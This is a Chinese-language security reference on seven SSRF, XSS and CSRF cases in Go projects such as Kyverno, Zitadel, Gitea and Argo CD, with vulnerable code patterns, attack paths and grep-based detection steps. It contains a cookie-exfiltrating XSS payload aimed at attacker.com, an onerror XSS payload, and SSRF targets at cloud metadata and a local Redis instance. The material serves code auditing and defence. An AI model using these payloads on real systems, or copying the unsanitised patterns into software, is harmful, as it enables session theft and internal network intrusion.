# Go SSRF / XSS / CSRF — Real-World Cases

7 个真实案例，覆盖 Go 生态中的 SSRF、XSS、CSRF 攻击模式。

---

### Case 1: Kyverno -- 跨 Namespace Policy apiCall SSRF (CVE-2026-22039, CVSS 10.0)

**Root Cause**: Kyverno 策略引擎的 `apiCall` 功能使用 Kyverno ServiceAccount 的集群级权限发起 HTTP/API 请求。低权限 namespace 用户可通过创建 policy 间接发起 SSRF，访问集群内部服务或其他 namespace 的资源。

**Source -> Sink 路径**:
- **Source**: Kyverno Policy 中的 `context.apiCall.urlPath` 或 `context.apiCall.service.url`
- **Sink**: Kyverno 使用自身 SA 发起的 HTTP 请求
- **Sanitization Gap**: apiCall URL 未限制可访问的地址范围

**Vulnerable Code Pattern**:
```go
func (e *engine) executeAPICall(ctx context.Context, call kyverno.APICall) (interface{}, error) {
    if call.Service != nil {
        // BUG: URL 来自 policy 定义，可指向任意内部服务
        req, _ := http.NewRequest("GET", call.Service.URL, nil)
        resp, err := e.httpClient.Do(req)
        return parseResponse(resp)
    }
    // K8s API call
    return e.client.Resource(call.URLPath).Get(ctx, metav1.GetOptions{})
}
```

**Attack Path**:
1. 低权限用户创建 Kyverno Policy，`apiCall` URL 指向 `http://metadata.google.internal/`
2. 触发 policy 评估
3. Kyverno 使用自身权限发起请求到 cloud metadata endpoint
4. 获取 cloud instance 的 credentials

**How to Detect**:
1. Grep `apiCall\|Service.URL\|httpClient.Do` 查找策略引擎的 HTTP 调用
2. 检查 URL 是否来自用户可控的 policy 定义
3. 确认是否有 URL 白名单或内网地址黑名单

---

### Case 2: Zitadel -- Action Script XSS 注入 (CVSS 8.7)

**Root Cause**: Zitadel 的 Action Script 功能允许管理员编写 JavaScript 脚本在认证流程中执行，但脚本输出未经 HTML 转义直接嵌入页面，导致存储型 XSS。

**Source -> Sink 路径**:
- **Source**: 管理员配置的 Action Script 输出
- **Sink**: 用户浏览器中的 HTML 页面渲染
- **Sanitization Gap**: Script 输出通过 `template.HTML()` 类型转换绕过了自动转义

**Vulnerable Code Pattern**:
```go
func renderLoginPage(w http.ResponseWriter, data LoginData) {
    // 执行 action script
    scriptOutput := executeActionScript(data.AuthRequest)

    templateData := map[string]interface{}{
        "CustomContent": template.HTML(scriptOutput), // BUG: 绕过自动转义
    }
    loginTemplate.Execute(w, templateData)
}
```

**Attack Path**:
1. 恶意管理员（或攻击者获取管理权限后）创建 Action Script
2. Script 输出包含 `<script>document.location='https://attacker.com/?cookie='+document.cookie</script>`
3. 每个登录用户的浏览器执行恶意脚本
4. Cookie 被发送到攻击者服务器

**How to Detect**:
1. Grep `template.HTML\|template.JS\|template.CSS` 查找自动转义绕过
2. 检查被转换的内容是否来自用户/管理员可控的数据
3. 确认是否使用了 `bluemonday` 等 HTML sanitizer

---

### Case 3: Memos -- Markdown XSS via 不安全 HTML 渲染 (CVSS 9.0)

**Root Cause**: Memos（备忘录应用）在渲染用户输入的 Markdown 时，允许嵌入 HTML 标签。攻击者可通过 Markdown 中的 HTML 注入 XSS payload，影响查看该 memo 的其他用户。

**Source -> Sink 路径**:
- **Source**: 用户创建的 Memo 内容（Markdown 格式）
- **Sink**: 其他用户浏览器中的 HTML 渲染
- **Sanitization Gap**: Markdown-to-HTML 转换后未进行 HTML sanitization

**Vulnerable Code Pattern**:
```go
func renderMemo(content string) template.HTML {
    // Markdown -> HTML 转换
    html := markdown.ToHTML([]byte(content), nil, nil)
    // BUG: 直接返回 HTML，未使用 bluemonday 等 sanitizer
    return template.HTML(html)
}
```

**Attack Path**:
1. 创建 Memo，内容包含 `<img src=x onerror="alert(document.cookie)">`
2. 其他用户查看该 Memo
3. 浏览器渲染 HTML，执行 onerror 中的 JavaScript
4. 窃取 session cookie 或执行其他恶意操作

**How to Detect**:
1. Grep `markdown.ToHTML\|blackfriday\|goldmark` 查找 Markdown 渲染
2. 检查 HTML 输出是否经过 `bluemonday.UGCPolicy().Sanitize()` 处理
3. 确认是否禁用了 Markdown 中的原始 HTML（`goldmark.WithRendererOptions(html.WithUnsafe())`）

---

### Case 4: Answer -- CSRF Token 缺失导致账户操作伪造 (CVSS 8.0)

**Root Cause**: Answer（问答平台）的状态修改 API 端点（如修改用户信息、发帖、投票）缺少 CSRF 保护，攻击者可构造恶意页面让已登录用户在不知情的情况下执行操作。

**Source -> Sink 路径**:
- **Source**: 攻击者构造的跨站 POST 请求
- **Sink**: Answer API 的状态修改端点
- **Sanitization Gap**: 缺少 CSRF token 中间件

**Vulnerable Code Pattern**:
```go
func setupRoutes(r *gin.Engine) {
    // BUG: 未使用 CSRF 中间件
    // r.Use(csrf.Middleware())

    api := r.Group("/api/v1")
    {
        api.POST("/answer/add", addAnswer)        // 无 CSRF 保护
        api.PUT("/user/info", updateUserInfo)      // 无 CSRF 保护
        api.POST("/vote/up", voteUp)               // 无 CSRF 保护
    }
}
```

**Attack Path**:
1. 攻击者创建恶意网页，包含隐藏表单
2. 表单 action 指向 Answer 的 API（如 `/api/v1/vote/up`）
3. 受害者在已登录 Answer 的状态下访问恶意页面
4. 浏览器自动携带 cookie 发送 POST 请求
5. Answer API 执行投票/修改等操作

**How to Detect**:
1. Grep `POST\|PUT\|DELETE\|PATCH` 查找状态修改路由
2. 检查是否注册了 `gorilla/csrf` 或类似的 CSRF 中间件
3. 确认 Cookie 是否设置了 `SameSite=Lax/Strict`

---

### Case 5: Argo CD -- ApplicationSet Webhook SSRF (CVSS 8.5)

**Root Cause**: Argo CD 的 ApplicationSet controller 在处理 Git generator 的 webhook 回调时，允许用户配置 webhook URL。该 URL 在服务端被请求，但未验证目标地址，导致 SSRF。

**Source -> Sink 路径**:
- **Source**: ApplicationSet 的 Git generator webhook 配置
- **Sink**: Argo CD controller 发起的 HTTP 请求
- **Sanitization Gap**: Webhook URL 未限制为外部可达地址

**Vulnerable Code Pattern**:
```go
func (g *GitGenerator) notifyWebhook(appSet *v1alpha1.ApplicationSet) error {
    webhookURL := appSet.Spec.Generators[0].Git.Webhook.URL
    // BUG: URL 未验证，可能指向内部服务
    resp, err := http.Post(webhookURL, "application/json", bytes.NewReader(payload))
    return err
}
```

**Attack Path**:
1. 创建 ApplicationSet，Git generator 的 webhook URL 设为 `http://169.254.169.254/latest/meta-data/`
2. 触发 ApplicationSet 同步
3. Argo CD controller 请求 cloud metadata endpoint
4. 通过 ApplicationSet 状态或日志获取响应内容

**How to Detect**:
1. Grep `webhook.*URL\|callback.*URL\|notify.*URL` 查找 webhook 配置
2. 检查 URL 是否来自用户可控的 CR 定义
3. 确认是否有 IP 黑名单过滤（`169.254.0.0/16`, `10.0.0.0/8` 等）

---

### Case 6: Mattermost -- Markdown 预览 XSS (CVSS 8.0)

**Root Cause**: Mattermost 的消息 Markdown 渲染在某些边缘情况下未正确转义 HTML 实体，攻击者可通过构造特殊的 Markdown 语法注入 JavaScript。

**Source -> Sink 路径**:
- **Source**: 用户发送的消息（Markdown 格式）
- **Sink**: 其他用户浏览器中的消息渲染
- **Sanitization Gap**: Markdown parser 的 HTML 转义在特殊语法组合下失效

**Vulnerable Code Pattern**:
```go
// Go 后端 API 返回原始 Markdown
func (a *App) getPost(postID string) (*Post, error) {
    post, err := a.store.GetPost(postID)
    // 后端返回原始 content，前端负责渲染
    // 但前端 Markdown renderer 在某些边缘情况下未转义
    return post, err
}
```

**Attack Path**:
1. 发送包含特殊 Markdown 语法的消息（如嵌套链接 + HTML 实体编码）
2. 前端 Markdown renderer 未正确处理边缘情况
3. HTML 标签逃逸到 DOM 中
4. JavaScript 在查看消息的用户浏览器中执行

**How to Detect**:
1. Grep `markdown\|Markdown\|render.*content\|sanitize` 查找渲染相关代码
2. 检查后端是否对 Markdown 中的 HTML 进行预过滤
3. 确认前端 renderer 是否配置为禁用原始 HTML

---

### Case 7: Gitea -- Webhook 回调 SSRF (CVSS 8.0)

**Root Cause**: Gitea 允许仓库所有者配置 webhook URL，当 push/PR 等事件发生时，Gitea 服务端向配置的 URL 发送 POST 请求。URL 未限制为外部地址，可用于扫描内网。

**Source -> Sink 路径**:
- **Source**: 仓库设置中的 webhook URL（用户配置）
- **Sink**: `http.Post(webhookURL, ...)` — 服务端发起请求
- **Sanitization Gap**: 未过滤内网地址和 localhost

**Vulnerable Code Pattern**:
```go
func deliverWebhook(hook *Webhook, event *Event) error {
    payload, _ := json.Marshal(event)
    // BUG: hook.URL 来自用户配置，可能是内网地址
    req, _ := http.NewRequest("POST", hook.URL, bytes.NewReader(payload))
    req.Header.Set("Content-Type", "application/json")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    // 响应内容可能通过 delivery log 泄露
    return err
}
```

**Attack Path**:
1. 在仓库中配置 webhook URL 为 `http://127.0.0.1:6379/`（Redis）
2. Push 代码触发 webhook
3. Gitea 向 Redis 发送 POST 请求（JSON payload 中可能包含 Redis 命令）
4. 通过 webhook delivery log 查看响应，探测内网服务

**How to Detect**:
1. Grep `webhook\|Webhook\|deliverHook\|notify` 查找 webhook 投递
2. 检查是否验证了 URL 不指向 `127.0.0.1`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`
3. 确认是否禁用了 HTTP redirect following
4. 检查 webhook delivery log 是否暴露了响应内容
